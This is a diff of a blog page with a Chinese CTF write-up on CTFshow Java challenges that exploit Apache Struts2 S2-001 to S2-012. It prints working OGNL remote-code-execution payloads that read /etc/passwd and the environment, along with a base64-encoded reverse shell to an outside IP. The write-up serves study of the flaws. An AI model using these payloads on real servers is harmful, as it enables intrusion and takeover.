@@ -20,20 +20,34 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# java CTFshow  前面主要是堆S2的系列漏洞复现，现在S2用的也比较少了，所以就大致过了一遍  # web279  首先打开靶场，只有一个whereisflag的链接，点击之后跳到如下界面  ![image.png](&#x2F;yuque-notes&#x2F;03-CTF Challenge&#39;s Writeup&#x2F;assets&#x2F;bdb94c1d-image.png)  一个需要登录的，纯萌新，就是半">
+  <meta name="description" content="前面主要是堆S2的系列漏洞复现，现在S2用的也比较少了，所以就大致过了一遍 web279 首先打开靶场，只有一个whereisflag的链接，点击之后跳到如下界面 一个需要登录的，纯萌新，就是半学半写，提示在url上面，S2-001，这个没了解过，于是就去搜索了一下这个是什么，有什么漏洞之类的。 要…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="java CTFshow">
 <meta property="og:url" content="http://example.com/2026/09/16/01-java-CTFshow/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# java CTFshow  前面主要是堆S2的系列漏洞复现，现在S2用的也比较少了，所以就大致过了一遍  # web279  首先打开靶场，只有一个whereisflag的链接，点击之后跳到如下界面  ![image.png](&#x2F;yuque-notes&#x2F;03-CTF Challenge&#39;s Writeup&#x2F;assets&#x2F;bdb94c1d-image.png)  一个需要登录的，纯萌新，就是半">
+<meta property="og:description" content="前面主要是堆S2的系列漏洞复现，现在S2用的也比较少了，所以就大致过了一遍 web279 首先打开靶场，只有一个whereisflag的链接，点击之后跳到如下界面 一个需要登录的，纯萌新，就是半学半写，提示在url上面，S2-001，这个没了解过，于是就去搜索了一下这个是什么，有什么漏洞之类的。 要…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
+<meta property="og:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
 <meta property="article:published_time" content="2026-09-16T14:21:43.000Z">
 <meta property="article:modified_time" content="2026-09-16T14:21:43.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
-<meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="CTFshow">
+<meta property="article:tag" content="Java">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/03-CTF%20Challenge">
 
 <link rel="canonical" href="http://example.com/2026/09/16/01-java-CTFshow/">
 
@@ -235,6 +249,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">前面主要是堆S2的系列漏洞复现，现在S2用的也比较少了，所以就大致过了一遍 web279 首先打开靶场，只有一个whereisflag的链接，点击之后跳到如下界面 一个需要登录的，纯萌新，就是半学半写，提示在url上面，S2-001，这个没了解过，于是就去搜索了一下这个是什么，有什么漏洞之类的。 要…</div>
 
         </div>
       </header>
@@ -245,158 +260,77 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# java CTFshow
-
-前面主要是堆S2的系列漏洞复现，现在S2用的也比较少了，所以就大致过了一遍
-
-# web279
-
-首先打开靶场，只有一个whereisflag的链接，点击之后跳到如下界面
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/bdb94c1d-image.png)
-
-一个需要登录的，纯萌新，就是半学半写，提示在url上面，S2-001，这个没了解过，于是就去搜索了一下这个是什么，有什么漏洞之类的。
-
+        <h1 id="java-CTFshow"><a href="#java-CTFshow" class="headerlink" title="java CTFshow"></a>java CTFshow</h1><p>前面主要是堆S2的系列漏洞复现，现在S2用的也比较少了，所以就大致过了一遍</p>
+<h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><p>首先打开靶场，只有一个whereisflag的链接，点击之后跳到如下界面</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/bdb94c1d-image.png" alt="image.png"></p>
+<p>一个需要登录的，纯萌新，就是半学半写，提示在url上面，S2-001，这个没了解过，于是就去搜索了一下这个是什么，有什么漏洞之类的。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取tomcat路径</span></span><br><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取web目录</span></span><br><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//rce</span></span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反弹shell，需要进行base64编码，改为自己的IP</span></span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;&#123;echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTguMjMuMTQ4LjUxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
 
-要进行url编码，否则会报错
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/f59b7a9c-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/cf657b55-image.png)
-
-或者利用工具：struts2scan
-
-## payload命令详解
-
-> %的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用$主要是在Struts 2配置文件中，引用OGNL表达式
-
-payload使用了Struts2的OGNL表达式语言来执行以下操作
-
-`#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start()`以这段代码为例，该代码创建了一个新的进程，并执行了一个命令，即whoami，接着通过`#b=#a.getInputStream()`获取命令输出的输入流，通过#c将输入流读取为字符流，#d创建一个缓冲字符读取器来读取字符流，#e创建一个字符数组来存储读取到的字符，#d.read(#e)将字符读取到字符数组中，`#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")`用于获取当前请求的HttpServeletResponse对象，最后，通过代码`#f.getWriter().println(new java.lang.String(#e))#f.getWriter().flush()#f.getWriter().close()`将字符数组转换为字符串，并将其输出到 HttpServletResponse 的输出流中
-
-## 知识总结
-
-### S2-001
-
-Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。（了解是个框架就行）
-
-漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/ee7c8b0a-image.png)
-
-以后遇到可以通过这个界面往S2这块联想，测试的话，`%{1+1}`如果回显是2，那么就可以往这块去做
-
-找到的大佬制作的可视集成工具，牛逼
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/12c5b0bb-image.png)
-
-​
-
-# web280
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b36c48a7-image.png)
-
-## S2-005
-
-​影响版本：Struts 2.0.0-2.1.8.1
-
-前面和第一题相同，点进去之后可以同理知道本题的漏洞是S2-005，直接去搜索漏洞
-
-- struts2 会将 http 的每个参数名解析为 OGNL 语句执行(可理解为 java 代码)。
-- S2-003 使用`\u0023`绕过s2对`#`的防御
-- S2-003 后官方增加了安全模式（沙盒）
-- S2-005 使用OGNL表达式将沙盒关闭，继续执行代码
-- 通过 unicode 编码 (**\u0023**) 或 8 进制 (**\43**) 即绕过了安全限制，
-
-找到一个很形象的描述，S2-003修补方案把自己上了一个锁，但是却把钥匙留在了锁上面。XWork会将GET参数的键和值利用OGNL表达式解析成Java语句。
-
-那么我们就知道S2-005是在S2-003的基础上实现的
-
-burpsuite抓包之后，修改为post上传
-
-`redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}`
-
+<p>要进行url编码，否则会报错</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/f59b7a9c-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/cf657b55-image.png" alt="image.png"></p>
+<p>或者利用工具：struts2scan</p>
+<h2 id="payload命令详解"><a href="#payload命令详解" class="headerlink" title="payload命令详解"></a>payload命令详解</h2><blockquote>
+<p>%的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用$主要是在Struts 2配置文件中，引用OGNL表达式</p>
+</blockquote>
+<p>payload使用了Struts2的OGNL表达式语言来执行以下操作</p>
+<p><code>#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start()</code>以这段代码为例，该代码创建了一个新的进程，并执行了一个命令，即whoami，接着通过<code>#b=#a.getInputStream()</code>获取命令输出的输入流，通过#c将输入流读取为字符流，#d创建一个缓冲字符读取器来读取字符流，#e创建一个字符数组来存储读取到的字符，#d.read(#e)将字符读取到字符数组中，<code>#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;)</code>用于获取当前请求的HttpServeletResponse对象，最后，通过代码<code>#f.getWriter().println(new java.lang.String(#e))#f.getWriter().flush()#f.getWriter().close()</code>将字符数组转换为字符串，并将其输出到 HttpServletResponse 的输出流中</p>
+<h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><p>Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。（了解是个框架就行）</p>
+<p>漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/ee7c8b0a-image.png" alt="image.png"></p>
+<p>以后遇到可以通过这个界面往S2这块联想，测试的话，<code>%{1+1}</code>如果回显是2，那么就可以往这块去做</p>
+<p>找到的大佬制作的可视集成工具，牛逼</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/12c5b0bb-image.png" alt="image.png"></p>
+<p>​</p>
+<h1 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h1><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b36c48a7-image.png" alt="image.png"></p>
+<h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><p>​影响版本：Struts 2.0.0-2.1.8.1</p>
+<p>前面和第一题相同，点进去之后可以同理知道本题的漏洞是S2-005，直接去搜索漏洞</p>
+<ul>
+<li>struts2 会将 http 的每个参数名解析为 OGNL 语句执行(可理解为 java 代码)。</li>
+<li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li>
+<li>S2-003 后官方增加了安全模式（沙盒）</li>
+<li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li>
+<li>通过 unicode 编码 (<strong>\u0023</strong>) 或 8 进制 (<strong>\43</strong>) 即绕过了安全限制，</li>
+</ul>
+<p>找到一个很形象的描述，S2-003修补方案把自己上了一个锁，但是却把钥匙留在了锁上面。XWork会将GET参数的键和值利用OGNL表达式解析成Java语句。</p>
+<p>那么我们就知道S2-005是在S2-003的基础上实现的</p>
+<p>burpsuite抓包之后，修改为post上传</p>
+<p><code>redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;#req=#context.get(<span class="string">&#x27;co&#x27;</span>+<span class="string">&#x27;m.open&#x27;</span>+<span class="string">&#x27;symphony.xwo&#x27;</span>+<span class="string">&#x27;rk2.disp&#x27;</span>+<span class="string">&#x27;atcher.HttpSer&#x27;</span>+<span class="string">&#x27;vletReq&#x27;</span>+<span class="string">&#x27;uest&#x27;</span>),#s=<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner((<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&#x27;cat /etc/passwd&#x27;</span>.toString().split(<span class="string">&#x27;\\s&#x27;</span>))).start().getInputStream()).useDelimiter(<span class="string">&#x27;\\AAAA&#x27;</span>),#str=#s.hasNext()?#s.next():<span class="string">&#x27;&#x27;</span>,#resp=#context.get(<span class="string">&#x27;co&#x27;</span>+<span class="string">&#x27;m.open&#x27;</span>+<span class="string">&#x27;symphony.xwo&#x27;</span>+<span class="string">&#x27;rk2.disp&#x27;</span>+<span class="string">&#x27;atcher.HttpSer&#x27;</span>+<span class="string">&#x27;vletRes&#x27;</span>+<span class="string">&#x27;ponse&#x27;</span>),#resp.setCharacterEncoding(<span class="string">&#x27;UTF-8&#x27;</span>),#resp.getWriter().println(#str),#resp.getWriter().flush(),#resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;\u0023_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;</span>)(meh)=<span class="literal">true</span>&amp;(aaa)((<span class="string">&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003d\u0023foo&#x27;</span>)(\u0023foo\u003dnew%20java.lang.Boolean(<span class="string">&quot;false&quot;</span>)))&amp;(asdf)((<span class="string">&#x27;\u0023rt.exit(1)&#x27;</span>)(\u0023rt\u003d<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>))=<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-# web281
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/7803f617-image.png)
-
-## S2-007
-
-影响版本：Struts 2.0.0 - 2.2.3
-
-在 S2 中，用户可以设置表单每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭合引号导致 ognl 的语法解析。
-
-后端从 entry.getValue() 获取到输入的参数，当运算出现错误的时候，会发起强制类型转换，之后进入函数 getOverrideExpr。在函数 getOverrideExpr 中，传入的参数会在两边拼接单引号，使得参数可以逃逸字符串的包裹，进而被解析并导致代码执行。
-
-`%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29%29+%2B+%27`在age里面回显，在env那里可以实现rce
-
-# web282
-
-## S2-008
-
-影响版本：Struts 2.1.0 – 2.3.1
-
-涉及多个漏洞，主要原因是后端对传入参数没有严格限制，导致多个地方可以执行恶意代码传入?debug=command&expression=即可执行OGNL表达式
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8305a8b4-image.png)
-
-题目提供了两种姿势，但是cookie那种对cookie的名称有较多限制，在传入struts2之前就被处理，也没有找到有说的，都是用第二种或者直接上工具（u1s1，我要你那工具运行的截图干嘛，没卵用）
-
-payload：`?debug=command&expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29%29`
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/65789071-image.png)
-
-# web283
-
-## S2-009
-
-影响版本：Struts 2.0.0 - Struts 2.3.1.1
-
-S2-009是S2-005的修复绕过，现在为了防止请求参数名中的OGNL表达式执行，主要做了以下两点：
-
-添加了类SecurityMemberAccess，且其属性allowStaticMethodAccess默认为false，来防止利用OGNL表达式去执行Java方法；
-
-在拦截器ParametersInterceptor中对请求参数名进行正则表达式白名单字符的匹配，来防止特殊符号(比如：#符号)经过unicode编码后的绕过。
-
-官方在参数拦截器中，将接受参数的正则进行了升级
-
+<h1 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h1><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/7803f617-image.png" alt="image.png"></p>
+<h2 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h2><p>影响版本：Struts 2.0.0 - 2.2.3</p>
+<p>在 S2 中，用户可以设置表单每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭合引号导致 ognl 的语法解析。</p>
+<p>后端从 entry.getValue() 获取到输入的参数，当运算出现错误的时候，会发起强制类型转换，之后进入函数 getOverrideExpr。在函数 getOverrideExpr 中，传入的参数会在两边拼接单引号，使得参数可以逃逸字符串的包裹，进而被解析并导致代码执行。</p>
+<p><code>%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29%29+%2B+%27</code>在age里面回显，在env那里可以实现rce</p>
+<h1 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h1><h2 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h2><p>影响版本：Struts 2.1.0 – 2.3.1</p>
+<p>涉及多个漏洞，主要原因是后端对传入参数没有严格限制，导致多个地方可以执行恶意代码传入?debug&#x3D;command&amp;expression&#x3D;即可执行OGNL表达式</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8305a8b4-image.png" alt="image.png"></p>
+<p>题目提供了两种姿势，但是cookie那种对cookie的名称有较多限制，在传入struts2之前就被处理，也没有找到有说的，都是用第二种或者直接上工具（u1s1，我要你那工具运行的截图干嘛，没卵用）</p>
+<p>payload：<code>?debug=command&amp;expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29%29</code></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/65789071-image.png" alt="image.png"></p>
+<h1 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h1><h2 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.1.1</p>
+<p>S2-009是S2-005的修复绕过，现在为了防止请求参数名中的OGNL表达式执行，主要做了以下两点：</p>
+<p>添加了类SecurityMemberAccess，且其属性allowStaticMethodAccess默认为false，来防止利用OGNL表达式去执行Java方法；</p>
+<p>在拦截器ParametersInterceptor中对请求参数名进行正则表达式白名单字符的匹配，来防止特殊符号(比如：#符号)经过unicode编码后的绕过。</p>
+<p>官方在参数拦截器中，将接受参数的正则进行了升级</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">acceptedParamNames</span> <span class="operator">=</span> <span class="string">&quot;[a-zA-Z0-9\.\]\[\(\)_&#x27;]+&quot;</span>;</span><br><span class="line">=&gt;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">acceptedParamNames</span> <span class="operator">=</span> <span class="string">&quot;\w+((\.\w+)|(\[\d+\])|(\(\d+\))|(\[&#x27;\w+&#x27;\])|(\(&#x27;\w+&#x27;\)))*&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-这次的绕过使用到了OGNL表达式求值的另一种写法：`[(ognl_java_code)(fuck)]`
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/08b47ae1-image.png)
-
-记一下一般的样式，混个眼熟
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b4bec104-image.png)
-
-访问ajax/example5(有些是example5.action)
-
+<p>这次的绕过使用到了OGNL表达式求值的另一种写法：<code>[(ognl_java_code)(fuck)]</code></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/08b47ae1-image.png" alt="image.png"></p>
+<p>记一下一般的样式，混个眼熟</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b4bec104-image.png" alt="image.png"></p>
+<p>访问ajax&#x2F;example5(有些是example5.action)</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip/ajax/example5?age=<span class="number">12313</span>&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>]=+<span class="keyword">new</span>+java.lang.Boolean(<span class="literal">false</span>),+%23_memberAccess[%22allowStaticMethodAccess%<span class="number">22</span>]=<span class="literal">true</span>,+%23a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%27env%<span class="number">27</span>).getInputStream(),%23b=<span class="keyword">new</span>+java.io.InputStreamReader(%23a),%23c=<span class="keyword">new</span>+java.io.BufferedReader(%23b),%<span class="number">23d</span>=<span class="keyword">new</span>+<span class="type">char</span>[<span class="number">51020</span>],%23c.read(%<span class="number">23d</span>),%23kxlzx=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),%23kxlzx.println(%<span class="number">23d</span>),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%<span class="number">27</span>)</span><br></pre></td></tr></table></figure>
 
-# web284
-
-## S2-012
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/7c4a6904-image.png)
-
-参考文章：
-
-[https://blog.csdn.net/mole_exp/article/details/122551201](https://blog.csdn.net/mole_exp/article/details/122551201)
-
-[https://blog.csdn.net/q20010619/article/details/120729447](https://blog.csdn.net/q20010619/article/details/120729447)
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/il581p16knx71t1u
-语雀文档ID: 188065505
-
+<h1 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h1><h2 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h2><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/7c4a6904-image.png" alt="image.png"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122551201">https://blog.csdn.net/mole_exp&#x2F;article&#x2F;details&#x2F;122551201</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/il581p16knx71t1u">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/il581p16knx71t1u</a><br>语雀文档ID: 188065505</p>
 
     </div>
 
@@ -406,9 +340,10 @@ S2-009是S2-005的修复绕过，现在为了防止请求参数名中的OGNL表�
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
               <a href="/tags/CTF/" rel="tag"># CTF</a>
               <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/CTFshow/" rel="tag"># CTFshow</a>
+              <a href="/tags/Java/" rel="tag"># Java</a>
           </div>
 
         
@@ -482,6 +417,7 @@ S2-009是S2-005的修复绕过，现在为了防止请求参数名中的OGNL表�
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
